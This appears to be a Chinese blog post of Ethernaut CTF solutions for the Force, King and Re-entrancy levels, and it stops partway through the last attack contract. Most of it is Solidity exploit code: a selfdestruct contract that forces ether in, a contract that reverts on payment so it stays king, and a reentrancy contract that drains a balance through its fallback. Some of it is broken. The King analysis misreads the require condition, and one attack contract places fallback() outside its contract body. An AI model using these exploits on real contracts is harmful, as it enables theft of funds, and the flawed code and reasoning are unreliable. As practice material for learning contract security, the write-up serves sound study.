<!-- build time:Thu Jul 17 2025 17:35:15 GMT+0800 (GMT+08:00) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="alternate" href="/rss.xml" title="Chain Roame" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="Chain Roame" type="application/atom+xml"><link rel="alternate" type="application/json" title="Chain Roame" href="https://chain-roamer.github.io/feed.json"><link rel="preconnect" href="https://s4.zstatic.net"><link rel="preconnect" href="https://at.alicdn.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="modulepreload" href="/js/siteInit.js"><link rel="modulepreload" href="/js/nyx-player-MUIVWBYI.js"><link rel="modulepreload" href="/js/copy-tex-GWWDTFDS.js"><link rel="modulepreload" href="/js/codeblock-F5H2OPOS.js"><link rel="modulepreload" href="/js/post-AFAAEMAS.js"><link rel="modulepreload" href="/js/chunk-C5CCWHOB.js"><link rel="modulepreload" href="/js/chunk-H3R3OFXD.js"><link rel="modulepreload" href="/js/search-4K7M4C5N.js"><link rel="modulepreload" href="/js/chunk-LL6IR3KG.js"><link rel="modulepreload" href="/js/index.esm-KAGITM4I.js"><link rel="modulepreload" href="/js/chunk-U22F3RYI.js"><link rel="modulepreload" href="/js/chunk-WM6CPLKW.js"><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="preload" href="https://www.dmoe.cc/random.php?10826" as="image" fetchpriority="high"><link rel="preload" href="https://www.dmoe.cc/random.php?251343" as="image" fetchpriority="high"><link rel="preload" href="https://www.dmoe.cc/random.php?469040" as="image" fetchpriority="high"><link rel="preload" href="https://www.dmoe.cc/random.php?165894" as="image" fetchpriority="high"><link rel="preload" href="https://www.dmoe.cc/random.php?19521" as="image" fetchpriority="high"><link rel="preload" href="https://www.dmoe.cc/random.php?316195" as="image" fetchpriority="high"><meta name="keywords" content="blockchain"><meta name="description" content="从零到中心化的旅程"><link rel="canonical" href="https://chain-roamer.github.io/2025/07/16/Ehternet/"><link rel="stylesheet" href="/css/post.css?v=0.5.1"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.1"><link rel="stylesheet" media="none" onload='this.media="all"' href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>Ehternaut</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Ehternaut</h1><div class="meta"><span class="item" title="创建时间：2025-07-16 13:08:25"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2025-07-16T13:08:25+08:00">2025-07-16</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>47k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>42 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Chain Roame</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image:url(&quot;https://www.dmoe.cc/random.php?10826&quot;)"></li><li class="item" style="background-image:url(&quot;https://www.dmoe.cc/random.php?251343&quot;)"></li><li class="item" style="background-image:url(&quot;https://www.dmoe.cc/random.php?469040&quot;)"></li><li class="item" style="background-image:url(&quot;https://www.dmoe.cc/random.php?165894&quot;)"></li><li class="item" style="background-image:url(&quot;https://www.dmoe.cc/random.php?19521&quot;)"></li><li class="item" style="background-image:url(&quot;https://www.dmoe.cc/random.php?316195&quot;)"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemlistelement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/blockchain/" itemprop="item" rel="index" title="分类于blockchain"><span itemprop="name">blockchain<meta itemprop="position" content="0"></span></a></span></div><article class="post block" itemscope itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://chain-roamer.github.io/2025/07/16/Ehternet/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"><meta itemprop="name" content="Chain Roame"><meta itemprop="description" content=", 从零到中心化的旅程"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Chain Roame"></span><div class="body md" itemprop="articleBody"><h2 id="force"><a class="anchor" href="#force">#</a> Force</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Force</span> <span class="token punctuation">&#123;</span><span class="token comment">/*</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>                   MEOW ?</pre></td></tr><tr><td data-num="7"></td><td><pre>         /\_/\   /</pre></td></tr><tr><td data-num="8"></td><td><pre>    ____/ o o \</pre></td></tr><tr><td data-num="9"></td><td><pre>  /~____  =ø= /</pre></td></tr><tr><td data-num="10"></td><td><pre> (______)__m_m)</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _owner<span class="token punctuation">)</span><span class="token keyword">payable</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span> _owner<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="king"><a class="anchor" href="#king">#</a> King</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">King</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token builtin">address</span> king<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token builtin">uint</span> <span class="token keyword">public</span> prize<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="11"></td><td><pre>    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> prize <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">payable</span><span class="token punctuation">(</span>king<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">_king</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">return</span> king<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>要求我们成为国王，并且不再改变。</p><p>Analyse<br>然而成为国王需要我们 msg.value 超过上个国王的 prize，并且 msg.sender == owner。显然第二个要求成立，但是当我们成为国王后，需要阻止别人超过我们。这时，我们发现 receive 函数是先转账，然后再修改成为国王的。因此，如果我们拒绝获得转账，那么就可以保持我们是国王了。</p><p>attack<br>我们需要先得到上个国王的 prize，只需运行 King 合约的 prize。</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">King</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token builtin">address</span> king<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token builtin">uint</span> <span class="token keyword">public</span> prize<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="12"></td><td><pre>    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> prize <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">payable</span><span class="token punctuation">(</span>king<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">_king</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">return</span> king<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> target<span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token builtin">uint</span> prize<span class="token operator">=</span> <span class="token function">King</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">prize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token punctuation">(</span><span class="token builtin">bool</span> ok<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> prize<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span>ok<span class="token punctuation">,</span><span class="token string">'call.failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token comment">//fallback() external payable&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token comment">//revert();</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token comment">//&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>该函数也就相当于什么的没有，即拒绝转账。</p><h2 id="re-entrancy"><a class="anchor" href="#re-entrancy">#</a> Re-entrancy</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.12</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token string">'openzeppelin-contracts-06/math/SafeMath.sol'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  </pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _who<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_who<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>      <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span>_amount<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>      <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        _amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>      balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span></pre></td></tr></table></figure><p>要求盗取所有余额。</p><p>Analyse<br>是重入攻击，漏洞在于 withdraw 函数。可以看到他是先调用了 msg.sender.call {value:_amount}(&quot;&quot;); 然后再在 balance 里面将存储的余额减去 amount。这里就是可重入攻击的关键所在了，因为该函数在发送 ether 后才更新余额，所以我们可以想办法让它卡在 call.value 这里不断给我们发送 ether，因为 call 的参数是空，所以会调用攻击合约的 fallback 函数，我们在 fallback 函数里面再次调用 withdraw，这样套娃，就能将合约里面的钱都偷出来。</p><p>Attack</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">interface</span> <span class="token class-name">IReentrance</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">address</span> levelInstance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _levelInstance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        levelInstance <span class="token operator">=</span> _levelInstance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">claim</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token function">IReentrance</span><span class="token punctuation">(</span>levelInstance<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>_amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token function">IReentrance</span><span class="token punctuation">(</span>levelInstance<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>还有一种是循环调用 withdraw 函数，并加以限制。</p><p>我们需要进行 donate 进行转账，来满足第一个条件，所以</p><p>然后执行 attack 函数。</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">interface</span> <span class="token class-name">IReentrance</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  IReentrance <span class="token keyword">private</span> immutable target<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _target<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    target<span class="token operator">=</span> <span class="token function">IReentrance</span><span class="token punctuation">(</span>_target<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    target<span class="token punctuation">.</span>donate<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> <span class="token number">1e18</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    target<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">1e18</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token 